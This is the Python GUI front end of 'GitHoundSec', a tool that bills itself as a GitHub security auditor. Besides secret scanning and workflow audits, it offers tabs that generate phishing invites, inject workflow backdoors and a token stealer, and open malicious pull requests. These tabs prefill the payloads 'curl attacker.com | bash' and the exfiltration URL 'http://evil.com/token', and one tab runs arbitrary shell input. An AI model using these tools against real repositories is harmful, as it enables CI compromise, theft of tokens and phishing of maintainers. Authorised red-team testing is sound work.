### frontend/main_gui.py
import customtkinter as ctk
from tkinter import messagebox
from backend.github_collector import collect_repos
from backend.run_trufflehog_single import run_trufflehog_generic
from backend.actions_audit import audit_repo_actions
from backend.graph_attack import build_graph_from_org
from backend.actions_permissions import scan_org_actions_permissions
from backend.phishing_template import generate_phishing_invite_html
from backend.pr_malicious import simulate_malicious_pr
from backend.workflow_exploit_finder import find_insecure_workflows
from backend.typosquat_detector import detect_typosquat_repos
from backend.zombie_secrets_hunter import zombie_secrets_scan
from backend.apt_recon_scanner import apt_recon
from backend.shadow_repo_hijack import detect_shadow_repo_candidates
from backend.workflow_backdoor_pr import inject_workflow_backdoor
from backend.token_theft_action_injector import inject_token_stealer_workflow
from backend.workflow_backdoor_pr_injector import inject_workflow_backdoor_pr
from backend.git_directory_scanner import find_git_directories
import subprocess
import os
import uuid

ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("blue")

class GitHoundSecApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("GitHoundSec - GitHub Security Auditor")
        self.geometry("700x1400")

        self.tabview = ctk.CTkTabview(self, width=680, height=1380)
        self.tabview.pack(padx=10, pady=10)

        self.home_tab = self.tabview.add("Home")
        self.trufflehog_tab = self.tabview.add("TruffleHog")    
        self.gitleaks_tab = self.tabview.add("Gitleaks")
        self.actions_tab = self.tabview.add("GitHub Actions")
        self.graph_tab = self.tabview.add("Users Graphic")
        self.apps_tab = self.tabview.add("Actions Perms")
        self.phishing_tab = self.tabview.add("Phishing Invite")
        self.pr_tab = self.tabview.add("Malicious PR")
        self.exploit_tab = self.tabview.add("Workflow Exploit Finder")
        self.typo_tab = self.tabview.add("Typosquat Detector")
        self.zombie_tab = self.tabview.add("Zombie Secrets Hunter")
        self.apt_tab = self.tabview.add("APT Recon Scanner")
        self.shadow_tab = self.tabview.add("Shadow Repo Hijack")
        self.backdoor_tab = self.tabview.add("Workflow Backdoor PR")
        self.stealer_tab = self.tabview.add("Token Stealer PR")
        self.prbackdoor_tab = self.tabview.add("Workflow PR Backdoor Injector")
        self.gitdir_tab = self.tabview.add(".git Directory Finder")


        self.setup_home_tab()
        self.setup_trufflehog_tab()
        self.setup_gitleaks_tab()
        self.setup_actions_tab()
        self.setup_graph_tab()
        self.setup_apps_tab()
        self.setup_phishing_tab()
        self.setup_pr_tab()
        self.setup_exploit_tab()
        self.setup_typo_tab()
        self.setup_zombie_tab()
        self.setup_apt_tab()
        self.setup_shadow_tab()
        self.setup_backdoor_tab()
        self.setup_stealer_tab()
        self.setup_prbackdoor_tab()
        self.setup_gitdir_tab()


    def setup_home_tab(self):
        self.token_label = ctk.CTkLabel(self.home_tab, text="GitHub Token:")
        self.token_label.pack(pady=10)
        self.token_entry = ctk.CTkEntry(self.home_tab, width=400)
        self.token_entry.pack(pady=5)

        self.org_label = ctk.CTkLabel(self.home_tab, text="Organization or Username:")
        self.org_label.pack(pady=10)
        self.org_entry = ctk.CTkEntry(self.home_tab, width=400)
        self.org_entry.pack(pady=5)

        self.collect_button = ctk.CTkButton(self.home_tab, text="Collect Repositories", command=self.start_collection)
        self.collect_button.pack(pady=20)

        self.output_box = ctk.CTkTextbox(self.home_tab, width=650, height=200)
        self.output_box.pack(pady=10)

    def setup_trufflehog_tab(self):
        self.th_target_label = ctk.CTkLabel(self.trufflehog_tab, text="Organization Name or Repository URL:")
        self.th_target_label.pack(pady=10)
        self.th_target_entry = ctk.CTkEntry(self.trufflehog_tab, width=500)
        self.th_target_entry.pack(pady=5)

        self.th_scan_button = ctk.CTkButton(self.trufflehog_tab, text="Run TruffleHog", command=self.run_trufflehog_scan)
        self.th_scan_button.pack(pady=10)

        self.th_output = ctk.CTkTextbox(self.trufflehog_tab, width=650, height=400)
        self.th_output.pack(pady=10)

    def setup_gitleaks_tab(self):
        self.gl_repo_label = ctk.CTkLabel(self.gitleaks_tab, text="Repository URL to Clone OR folder name in temp_repos:")
        self.gl_repo_label.pack(pady=10)
        self.gl_repo_entry = ctk.CTkEntry(self.gitleaks_tab, width=500)
        self.gl_repo_entry.pack(pady=5)

        self.gl_clone_button = ctk.CTkButton(self.gitleaks_tab, text="Clone or Use Local Repository", command=self.clone_or_use_local_repo)
        self.gl_clone_button.pack(pady=10)

        self.gl_token_checkbox_var = ctk.BooleanVar()
        self.gl_token_checkbox = ctk.CTkCheckBox(self.gitleaks_tab, text="Use GitHub Token", variable=self.gl_token_checkbox_var, command=self.toggle_gitleaks_token)
        self.gl_token_checkbox.pack(pady=5)
        self.gl_token_entry = ctk.CTkEntry(self.gitleaks_tab, width=400, placeholder_text="GITHUB_TOKEN (optional)")
        self.gl_token_entry.pack(pady=5)
        self.gl_token_entry.configure(state="disabled")

        self.gl_config_checkbox_var = ctk.BooleanVar()
        self.gl_config_checkbox = ctk.CTkCheckBox(self.gitleaks_tab, text="Use external config file", variable=self.gl_config_checkbox_var, command=self.toggle_gitleaks_config)
        self.gl_config_checkbox.pack(pady=5)
        self.gl_config_entry = ctk.CTkEntry(self.gitleaks_tab, width=500, placeholder_text="Path to .toml file")
        self.gl_config_entry.pack(pady=5)
        self.gl_config_entry.configure(state="disabled")

        self.gl_terminal_checkbox_var = ctk.BooleanVar(value=True)
        self.gl_terminal_checkbox = ctk.CTkCheckBox(self.gitleaks_tab, text="Use manual terminal", variable=self.gl_terminal_checkbox_var, command=self.toggle_terminal_gitleaks)
        self.gl_terminal_checkbox.pack(pady=5)

        self.gl_cmd_label = ctk.CTkLabel(self.gitleaks_tab, text="Gitleaks Terminal (Enter commands below):")
        self.gl_cmd_label.pack(pady=5)
        self.gl_cmd_entry = ctk.CTkEntry(self.gitleaks_tab, width=600)
        self.gl_cmd_entry.pack(pady=5)

        self.gl_run_button = ctk.CTkButton(self.gitleaks_tab, text="Run Command or Default Scan", command=self.run_gitleaks_command_or_scan)
        self.gl_run_button.pack(pady=5)

        self.gl_output = ctk.CTkTextbox(self.gitleaks_tab, width=650, height=300)
        self.gl_output.pack(pady=10)

    def toggle_gitleaks_token(self):
        state = "normal" if self.gl_token_checkbox_var.get() else "disabled"
        self.gl_token_entry.configure(state=state)

    def toggle_gitleaks_config(self):
        state = "normal" if self.gl_config_checkbox_var.get() else "disabled"
        self.gl_config_entry.configure(state=state)

    def toggle_terminal_gitleaks(self):
        state = "normal" if self.gl_terminal_checkbox_var.get() else "disabled"
        self.gl_cmd_entry.configure(state=state)

    def clone_or_use_local_repo(self):
        entry_value = self.gl_repo_entry.get().strip()
        if not entry_value:
            messagebox.showerror("Error", "Provide a repository URL or a folder name under temp_repos/")
            return

        if entry_value.startswith("http"):
            repo_url = entry_value
            repo_name = repo_url.split("/")[-1].replace(".git", "")
            dest_path = os.path.join("temp_repos", repo_name)
            os.makedirs("temp_repos", exist_ok=True)
            result = subprocess.run(["git", "clone", repo_url, dest_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            self.gl_output.insert("end", f"[+] Cloning {repo_url}\n")
            if result.stdout:
                self.gl_output.insert("end", result.stdout)
            if result.stderr:
                self.gl_output.insert("end", result.stderr)
            self.gl_output.insert("end", f"[+] Repository cloned to: {dest_path}\n")
        else:
            local_path = os.path.join("temp_repos", entry_value)
            if os.path.isdir(local_path):
                self.gl_output.insert("end", f"[✔] Local repository found: {local_path}\n")
            else:
                self.gl_output.insert("end", f"[✖] Folder '{entry_value}' not found in temp_repos/\n")

    def run_gitleaks_command_or_scan(self):
        repo_name = self.gl_repo_entry.get().strip()
        if not repo_name:
            messagebox.showerror("Error", "Provide the repository name.")
            return

        if self.gl_terminal_checkbox_var.get():
            self.run_gitleaks_command()
            return

        path = os.path.join("temp_repos", repo_name)
        output_dir = "outputs"
        os.makedirs(output_dir, exist_ok=True)
        report_path = os.path.join(output_dir, f"gitleaks-report-{uuid.uuid4().hex[:8]}.json")

        cmd = ["gitleaks", "detect", "--source", path, "--report-format", "json", "--report-path", report_path, "-v"]

        if self.gl_config_checkbox_var.get():
            config_path = self.gl_config_entry.get().strip()
            if config_path:
                cmd += ["--config", config_path]

        self.gl_output.delete("1.0", "end")
        self.gl_output.insert("end", f"$ {' '.join(cmd)}\n")
        try:
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.stdout:
                self.gl_output.insert("end", result.stdout)
            if result.stderr:
                self.gl_output.insert("end", result.stderr)
            self.gl_output.insert("end", f"\n📁 Report generated: {report_path}\n")
        except Exception as e:
            self.gl_output.insert("end", f"Error: {e}\n")

    def run_gitleaks_command(self):
        cmd = self.gl_cmd_entry.get()
        if not cmd:
            messagebox.showerror("Error", "Enter a command to execute.")
            return
        self.gl_output.insert("end", f"$ {cmd}\n")
        try:
            result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.stdout:
                self.gl_output.insert("end", result.stdout)
            if result.stderr:
                self.gl_output.insert("end", result.stderr)
        except Exception as e:
            self.gl_output.insert("end", f"Error: {e}\n")

    def setup_actions_tab(self):
        self.action_repo_label = ctk.CTkLabel(self.actions_tab, text="GitHub Repository URL:")
        self.action_repo_label.pack(pady=10)
        self.action_repo_entry = ctk.CTkEntry(self.actions_tab, width=500)
        self.action_repo_entry.pack(pady=5)

        self.action_scan_button = ctk.CTkButton(self.actions_tab, text="Audit Workflows", command=self.start_actions_audit)
        self.action_scan_button.pack(pady=20)

        self.action_output = ctk.CTkTextbox(self.actions_tab, width=650, height=250)
        self.action_output.pack(pady=10)

    def start_collection(self):
        token = self.token_entry.get()
        org = self.org_entry.get()
        if not token or not org:
            messagebox.showerror("Error", "Token and organization are required.")
            return
        self.output_box.delete("1.0", "end")
        try:
            repos = collect_repos(token, org)
            for r in repos:
                self.output_box.insert("end", f"{r}\n")
        except Exception as e:
            messagebox.showerror("Error collecting repositories", str(e))

    def run_trufflehog_scan(self):
        target = self.th_target_entry.get().strip()
        if not target:
            messagebox.showerror("Error", "Provide the organization or repository URL.")
            return

        repo_id = target.replace('/', '_').replace('https:', '').replace('.', '_')
        output_path = os.path.join("outputs", f"{repo_id}_trufflehog_{uuid.uuid4().hex[:8]}.json")

        self.th_output.delete("1.0", "end")
        self.th_output.insert("end", "🔍 Running TruffleHog...\n\n")
        try:
            if target.startswith("http"):
                cmd = ["trufflehog", "git", target, "--json", "--no-update"]
            else:
                cmd = ["trufflehog", "github", f"--org={target}", "--json", "--no-update"]

            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            with open(output_path, 'w') as f:
                f.write(result.stdout)

            self.th_output.insert("end", f"📦 Report saved to: {output_path}\n\n")
            if result.stdout:
                self.th_output.insert("end", result.stdout + "\n")
            if result.stderr:
                self.th_output.insert("end", f"⚠️ STDERR:\n{result.stderr}\n")
        except Exception as e:
            self.th_output.insert("end", f"❌ Error: {str(e)}\n")

    def start_actions_audit(self):
        repo_url = self.action_repo_entry.get()
        if not repo_url:
            messagebox.showerror("Error", "Provide the repository URL.")
            return
        self.action_output.delete("1.0", "end")
        try:
            repo_name = repo_url.split("/")[-1]
            local_path = os.path.join("temp_repos", repo_name)
            os.makedirs("temp_repos", exist_ok=True)
            subprocess.run(["git", "clone", repo_url, local_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            findings = audit_repo_actions(local_path)
            if findings:
                for f in findings:
                    self.action_output.insert("end", f + "\n")
            else:
                self.action_output.insert("end", "No risks found in workflows.")
        except Exception as e:
            messagebox.showerror("Error auditing Actions", str(e))

    def setup_graph_tab(self):
        self.graph_label = ctk.CTkLabel(self.graph_tab, text="GitHub Organization Name:")
        self.graph_label.pack(pady=10)
        self.graph_entry = ctk.CTkEntry(self.graph_tab, width=500)
        self.graph_entry.pack(pady=5)

        self.graph_button = ctk.CTkButton(self.graph_tab, text="Generate Graph", command=self.run_graph_attack)
        self.graph_button.pack(pady=10)

        self.graph_output = ctk.CTkTextbox(self.graph_tab, width=650, height=350)
        self.graph_output.pack(pady=10)

    def run_graph_attack(self):
        org = self.graph_entry.get().strip()
        token = self.token_entry.get().strip()
        if not org:
            messagebox.showerror("Error", "Please enter an organization name.")
            return
        self.graph_output.delete("1.0", "end")
        self.graph_output.insert("end", f"🔍 Fetching data and building graph for organization: {org}...\n")
        try:
            output_file = build_graph_from_org(org, token)
            self.graph_output.insert("end", f"✅ Graph generated successfully!\nFile: {output_file}\n")
        except Exception as e:
            self.graph_output.insert("end", f"❌ Error: {str(e)}\n")

    def setup_apps_tab(self):
        self.apps_label = ctk.CTkLabel(self.apps_tab, text="GitHub Organization:")
        self.apps_label.pack(pady=10)
        self.apps_entry = ctk.CTkEntry(self.apps_tab, width=500)
        self.apps_entry.pack(pady=5)

        self.apps_button = ctk.CTkButton(self.apps_tab, text="Scan Actions & App Permissions", command=self.run_actions_permissions_scan)
        self.apps_button.pack(pady=10)

        self.apps_output = ctk.CTkTextbox(self.apps_tab, width=650, height=400)
        self.apps_output.pack(pady=10)


    def run_actions_permissions_scan(self):
        org = self.apps_entry.get().strip()
        token = self.token_entry.get().strip()
        if not org:
            messagebox.showerror("Error", "Please enter a GitHub organization.")
            return

        self.apps_output.delete("1.0", "end")
        self.apps_output.insert("end", f"🔍 Scanning Actions and Apps for: {org}...\n\n")
        try:
            findings = scan_org_actions_permissions(org, token)
            if not findings:
                self.apps_output.insert("end", "✅ No critical findings detected.\n")
                return
            for repo, issues in findings.items():
                self.apps_output.insert("end", f"📦 Repository: {repo}\n")
                for issue in issues:
                    self.apps_output.insert("end", f"   - {issue}\n")
                self.apps_output.insert("end", "\n")
        except Exception as e:
            self.apps_output.insert("end", f"❌ Error: {str(e)}\n")

    def setup_phishing_tab(self):
        self.phish_org_label = ctk.CTkLabel(self.phishing_tab, text="Organization Name:")
        self.phish_org_label.pack(pady=5)
        self.phish_org_entry = ctk.CTkEntry(self.phishing_tab, width=400)
        self.phish_org_entry.pack(pady=5)

        self.phish_repo_label = ctk.CTkLabel(self.phishing_tab, text="Repository Name:")
        self.phish_repo_label.pack(pady=5)
        self.phish_repo_entry = ctk.CTkEntry(self.phishing_tab, width=400)
        self.phish_repo_entry.pack(pady=5)

        self.phish_sender_label = ctk.CTkLabel(self.phishing_tab, text="Sender Username:")
        self.phish_sender_label.pack(pady=5)
        self.phish_sender_entry = ctk.CTkEntry(self.phishing_tab, width=400)
        self.phish_sender_entry.pack(pady=5)

        self.phish_target_label = ctk.CTkLabel(self.phishing_tab, text="Target Username:")
        self.phish_target_label.pack(pady=5)
        self.phish_target_entry = ctk.CTkEntry(self.phishing_tab, width=400)
        self.phish_target_entry.pack(pady=5)

        self.phish_button = ctk.CTkButton(self.phishing_tab, text="Generate Invite Template", command=self.run_phishing_invite)
        self.phish_button.pack(pady=10)

        self.phish_output = ctk.CTkTextbox(self.phishing_tab, width=650, height=300)
        self.phish_output.pack(pady=10)

        self.phish_open_button = ctk.CTkButton(self.phishing_tab, text="Open HTML in Browser", command=self.open_last_phish_file)
        self.phish_open_button.pack(pady=5)

        self.last_phish_file = None

    def run_phishing_invite(self):
        org = self.phish_org_entry.get().strip()
        repo = self.phish_repo_entry.get().strip()
        sender = self.phish_sender_entry.get().strip()
        target = self.phish_target_entry.get().strip()

        self.phish_output.delete("1.0", "end")

        if not org or not repo or not sender or not target:
            messagebox.showerror("Error", "Please fill in all fields.")
            return

        try:
            output = generate_phishing_invite_html(org, repo, sender, target)
            self.last_phish_file = output
            self.phish_output.insert("end", f"📧 Template generated: {output}\n")
        except Exception as e:
            self.phish_output.insert("end", f"❌ Error: {str(e)}\n")

    def open_last_phish_file(self):
        if self.last_phish_file and os.path.exists(self.last_phish_file):
            webbrowser.open(f"file://{os.path.abspath(self.last_phish_file)}")
        else:
            messagebox.showinfo("Info", "No template has been generated yet.")

    def setup_pr_tab(self):
        self.pr_repo_label = ctk.CTkLabel(self.pr_tab, text="GitHub Repository URL:")
        self.pr_repo_label.pack(pady=5)
        self.pr_repo_entry = ctk.CTkEntry(self.pr_tab, width=500)
        self.pr_repo_entry.pack(pady=5)

        self.pr_payload_label = ctk.CTkLabel(self.pr_tab, text="Payload Command (ex: curl attacker.com | bash):")
        self.pr_payload_label.pack(pady=5)
        self.pr_payload_entry = ctk.CTkEntry(self.pr_tab, width=500)
        self.pr_payload_entry.pack(pady=5)

        self.pr_token_label = ctk.CTkLabel(self.pr_tab, text="GitHub Token:")
        self.pr_token_label.pack(pady=5)
        self.pr_token_entry = ctk.CTkEntry(self.pr_tab, width=500, show="*")
        self.pr_token_entry.pack(pady=5)

        self.pr_interactive_checkbox_var = ctk.BooleanVar()
        self.pr_interactive_checkbox = ctk.CTkCheckBox(self.pr_tab, text="Use Terminal Mode", variable=self.pr_interactive_checkbox_var)
        self.pr_interactive_checkbox.pack(pady=5)

        self.pr_terminal_label = ctk.CTkLabel(self.pr_tab, text="Terminal Input (one command per line):")
        self.pr_terminal_label.pack(pady=5)
        self.pr_terminal_entry = ctk.CTkTextbox(self.pr_tab, width=650, height=120)
        self.pr_terminal_entry.pack(pady=5)

        self.pr_button = ctk.CTkButton(self.pr_tab, text="Simulate Malicious PR", command=self.run_malicious_pr)
        self.pr_button.pack(pady=10)

        self.pr_output = ctk.CTkTextbox(self.pr_tab, width=650, height=300)
        self.pr_output.pack(pady=10)

    def run_malicious_pr(self):
        repo_url = self.pr_repo_entry.get().strip()
        payload = self.pr_payload_entry.get().strip()
        token = self.pr_token_entry.get().strip()
        interactive = self.pr_interactive_checkbox_var.get()
        terminal_cmds = self.pr_terminal_entry.get("1.0", "end").strip()

        self.pr_output.delete("1.0", "end")

        if not repo_url or not payload or not token:
            messagebox.showerror("Error", "All fields (Repo URL, Payload, Token) are required.")
            return

        try:
            result = simulate_malicious_pr(
                repo_url=repo_url,
                github_token=token,
                payload_cmd=payload,
                interactive=interactive,
                terminal_input=terminal_cmds
            )
            self.pr_output.insert("end", f"{result}\n")
        except Exception as e:
            self.pr_output.insert("end", f"❌ Error: {str(e)}\n")

    def setup_exploit_tab(self):
        self.exploit_label = ctk.CTkLabel(self.exploit_tab, text="Path to local cloned repo (e.g., temp_repos/repo):")
        self.exploit_label.pack(pady=5)
        self.exploit_entry = ctk.CTkEntry(self.exploit_tab, width=500)
        self.exploit_entry.pack(pady=5)

        self.exploit_button = ctk.CTkButton(self.exploit_tab, text="Scan Workflows", command=self.run_workflow_exploit_scan)
        self.exploit_button.pack(pady=10)

        self.exploit_output = ctk.CTkTextbox(self.exploit_tab, width=650, height=400)
        self.exploit_output.pack(pady=10)

    def run_workflow_exploit_scan(self):
        repo_path = self.exploit_entry.get().strip()
        self.exploit_output.delete("1.0", "end")

        if not repo_path or not os.path.exists(repo_path):
            messagebox.showerror("Error", "Invalid repository path.")
            return

        try:
            findings = find_insecure_workflows(repo_path)
            for f in findings:
                self.exploit_output.insert("end", f + "\n")
        except Exception as e:
            self.exploit_output.insert("end", f"❌ Error: {str(e)}\n")

    def setup_typo_tab(self):
        self.typo_label = ctk.CTkLabel(self.typo_tab, text="Organization name:")
        self.typo_label.pack(pady=5)
        self.typo_entry = ctk.CTkEntry(self.typo_tab, width=500)
        self.typo_entry.pack(pady=5)

        self.typo_token_label = ctk.CTkLabel(self.typo_tab, text="GitHub Token (optional):")
        self.typo_token_label.pack(pady=5)
        self.typo_token_entry = ctk.CTkEntry(self.typo_tab, width=500, show="*")
        self.typo_token_entry.pack(pady=5)

        self.typo_button = ctk.CTkButton(self.typo_tab, text="Detect Typosquat Repos", command=self.run_typosquat_scan)
        self.typo_button.pack(pady=10)

        self.typo_output = ctk.CTkTextbox(self.typo_tab, width=650, height=400)
        self.typo_output.pack(pady=10)

    def run_typosquat_scan(self):
        org = self.typo_entry.get().strip()
        token = self.typo_token_entry.get().strip()
        self.typo_output.delete("1.0", "end")

        if not org:
            messagebox.showerror("Error", "Please enter the organization name.")
            return

        try:
            results = detect_typosquat_repos(org_name=org, token=token)
            for line in results:
                self.typo_output.insert("end", line + "\n")
        except Exception as e:
            self.typo_output.insert("end", f"❌ Error: {str(e)}\n")

    def setup_zombie_tab(self):
        self.zombie_label = ctk.CTkLabel(self.zombie_tab, text="Path to local cloned repo (e.g., temp_repos/repo):")
        self.zombie_label.pack(pady=5)
        self.zombie_entry = ctk.CTkEntry(self.zombie_tab, width=500)
        self.zombie_entry.pack(pady=5)

        self.zombie_button = ctk.CTkButton(self.zombie_tab, text="Scan Zombie Secrets", command=self.run_zombie_scan)
        self.zombie_button.pack(pady=10)

        self.zombie_output = ctk.CTkTextbox(self.zombie_tab, width=650, height=400)
        self.zombie_output.pack(pady=10)

    def run_zombie_scan(self):
        path = self.zombie_entry.get().strip()
        self.zombie_output.delete("1.0", "end")

        if not path or not os.path.exists(path):
            messagebox.showerror("Error", "Invalid repository path.")
            return

        try:
            results = zombie_secrets_scan(path)
            for line in results:
                self.zombie_output.insert("end", line + "\n")
        except Exception as e:
            self.zombie_output.insert("end", f"❌ Error: {str(e)}\n")

    def setup_apt_tab(self):
        self.apt_label = ctk.CTkLabel(self.apt_tab, text="GitHub Organization:")
        self.apt_label.pack(pady=5)
        self.apt_entry = ctk.CTkEntry(self.apt_tab, width=500)
        self.apt_entry.pack(pady=5)

        self.apt_token_label = ctk.CTkLabel(self.apt_tab, text="GitHub Token (optional):")
        self.apt_token_label.pack(pady=5)
        self.apt_token_entry = ctk.CTkEntry(self.apt_tab, width=500, show="*")
        self.apt_token_entry.pack(pady=5)

        self.apt_button = ctk.CTkButton(self.apt_tab, text="Start Recon", command=self.run_apt_scan)
        self.apt_button.pack(pady=10)

        self.apt_output = ctk.CTkTextbox(self.apt_tab, width=650, height=500)
        self.apt_output.pack(pady=10)

    def run_apt_scan(self):
        org = self.apt_entry.get().strip()
        token = self.apt_token_entry.get().strip()
        self.apt_output.delete("1.0", "end")

        if not org:
            messagebox.showerror("Error", "Please enter the organization name.")
            return

        try:
            results = apt_recon(org_name=org, token=token)
            for line in results:
                self.apt_output.insert("end", line + "\n")
        except Exception as e:
            self.apt_output.insert("end", f"❌ Error: {str(e)}\n")

    def setup_shadow_tab(self):
        self.shadow_label = ctk.CTkLabel(self.shadow_tab, text="GitHub Organization:")
        self.shadow_label.pack(pady=5)
        self.shadow_entry = ctk.CTkEntry(self.shadow_tab, width=500)
        self.shadow_entry.pack(pady=5)

        self.shadow_token_label = ctk.CTkLabel(self.shadow_tab, text="GitHub Token (optional):")
        self.shadow_token_label.pack(pady=5)
        self.shadow_token_entry = ctk.CTkEntry(self.shadow_tab, width=500, show="*")
        self.shadow_token_entry.pack(pady=5)

        self.shadow_button = ctk.CTkButton(self.shadow_tab, text="Scan for Shadow Repos", command=self.run_shadow_scan)
        self.shadow_button.pack(pady=10)

        self.shadow_output = ctk.CTkTextbox(self.shadow_tab, width=650, height=500)
        self.shadow_output.pack(pady=10)

    def run_shadow_scan(self):
        org = self.shadow_entry.get().strip()
        token = self.shadow_token_entry.get().strip()
        self.shadow_output.delete("1.0", "end")

        if not org:
            messagebox.showerror("Error", "Please enter the organization name.")
            return

        try:
            results = detect_shadow_repo_candidates(org_name=org, token=token)
            for line in results:
                self.shadow_output.insert("end", line + "\n")
        except Exception as e:
            self.shadow_output.insert("end", f"❌ Error: {str(e)}\n")

    def setup_backdoor_tab(self):
        self.backdoor_label = ctk.CTkLabel(self.backdoor_tab, text="Path to local cloned repo (e.g., temp_repos/repo):")
        self.backdoor_label.pack(pady=5)
        self.backdoor_entry = ctk.CTkEntry(self.backdoor_tab, width=500)
        self.backdoor_entry.pack(pady=5)

        self.backdoor_payload_label = ctk.CTkLabel(self.backdoor_tab, text="Payload Command (e.g., curl attacker.com | bash):")
        self.backdoor_payload_label.pack(pady=5)
        self.backdoor_payload_entry = ctk.CTkEntry(self.backdoor_tab, width=500)
        self.backdoor_payload_entry.insert(0, "curl attacker.com | bash")
        self.backdoor_payload_entry.pack(pady=5)

        self.backdoor_button = ctk.CTkButton(self.backdoor_tab, text="Inject Workflow Backdoor", command=self.run_backdoor_injection)
        self.backdoor_button.pack(pady=10)

        self.backdoor_output = ctk.CTkTextbox(self.backdoor_tab, width=650, height=300)
        self.backdoor_output.pack(pady=10)

    def run_backdoor_injection(self):
        repo_path = self.backdoor_entry.get().strip()
        payload = self.backdoor_payload_entry.get().strip()
        self.backdoor_output.delete("1.0", "end")

        if not repo_path:
            messagebox.showerror("Error", "Please enter the repo path.")
            return

        try:
            result = inject_workflow_backdoor(repo_path, payload)
            self.backdoor_output.insert("end", result + "\n")
        except Exception as e:
            self.backdoor_output.insert("end", f"❌ Error: {str(e)}\n")

    def setup_stealer_tab(self):
        self.stealer_label = ctk.CTkLabel(self.stealer_tab, text="Path to local cloned repo (e.g., temp_repos/repo):")
        self.stealer_label.pack(pady=5)
        self.stealer_entry = ctk.CTkEntry(self.stealer_tab, width=500)
        self.stealer_entry.pack(pady=5)

        self.stealer_url_label = ctk.CTkLabel(self.stealer_tab, text="Exfiltration URL (e.g., http://evil.com/token):")
        self.stealer_url_label.pack(pady=5)
        self.stealer_url_entry = ctk.CTkEntry(self.stealer_tab, width=500)
        self.stealer_url_entry.insert(0, "http://evil.com/token")
        self.stealer_url_entry.pack(pady=5)

        self.stealer_button = ctk.CTkButton(self.stealer_tab, text="Inject Token Stealer", command=self.run_token_stealer)
        self.stealer_button.pack(pady=10)

        self.stealer_output = ctk.CTkTextbox(self.stealer_tab, width=650, height=300)
        self.stealer_output.pack(pady=10)

    def run_token_stealer(self):
        repo_path = self.stealer_entry.get().strip()
        exfil_url = self.stealer_url_entry.get().strip()
        self.stealer_output.delete("1.0", "end")

        if not repo_path:
            messagebox.showerror("Error", "Please enter the repo path.")
            return

        try:
            result = inject_token_stealer_workflow(repo_path, exfil_url)
            self.stealer_output.insert("end", result + "\n")
        except Exception as e:
            self.stealer_output.insert("end", f"❌ Error: {str(e)}\n")

    def setup_prbackdoor_tab(self):
        self.prb_label = ctk.CTkLabel(self.prbackdoor_tab, text="Path to local cloned repo (e.g., temp_repos/repo):")
        self.prb_label.pack(pady=5)
        self.prb_entry = ctk.CTkEntry(self.prbackdoor_tab, width=500)
        self.prb_entry.pack(pady=5)

        self.prb_payload_label = ctk.CTkLabel(self.prbackdoor_tab, text="Payload Command (e.g., curl attacker.com | bash):")
        self.prb_payload_label.pack(pady=5)
        self.prb_payload_entry = ctk.CTkEntry(self.prbackdoor_tab, width=500)
        self.prb_payload_entry.insert(0, "curl attacker.com | bash")
        self.prb_payload_entry.pack(pady=5)

        self.prb_button = ctk.CTkButton(self.prbackdoor_tab, text="Inject Backdoor via PR", command=self.run_prbackdoor)
        self.prb_button.pack(pady=10)

        self.prb_output = ctk.CTkTextbox(self.prbackdoor_tab, width=650, height=300)
        self.prb_output.pack(pady=10)

    def run_prbackdoor(self):
        repo_path = self.prb_entry.get().strip()
        payload = self.prb_payload_entry.get().strip()
        self.prb_output.delete("1.0", "end")

        if not repo_path:
            messagebox.showerror("Error", "Please enter the repo path.")
            return

        try:
            result = inject_workflow_backdoor_pr(repo_path, payload)
            self.prb_output.insert("end", result + "\n")
        except Exception as e:
            self.prb_output.insert("end", f"❌ Error: {str(e)}\n")

    def setup_gitdir_tab(self):
        self.gitdir_label = ctk.CTkLabel(self.gitdir_tab, text="Domain to scan for .git exposure:")
        self.gitdir_label.pack(pady=5)
        self.gitdir_entry = ctk.CTkEntry(self.gitdir_tab, width=500)
        self.gitdir_entry.pack(pady=5)

        self.gitdir_button = ctk.CTkButton(self.gitdir_tab, text="Scan .git Directories", command=self.run_gitdir_scan)
        self.gitdir_button.pack(pady=10)

        self.gitdir_output = ctk.CTkTextbox(self.gitdir_tab, width=650, height=400)
        self.gitdir_output.pack(pady=10)

    def run_gitdir_scan(self):
        domain = self.gitdir_entry.get().strip()
        self.gitdir_output.delete("1.0", "end")

        if not domain:
            messagebox.showerror("Error", "Please enter a domain.")
            return

        try:
            results = find_git_directories(domain)
            for line in results:
                self.gitdir_output.insert("end", line + "\n")
        except Exception as e:
            self.gitdir_output.insert("end", f"❌ Error: {str(e)}\n")
            
if __name__ == "__main__":
    app = GitHoundSecApp()
    app.mainloop()
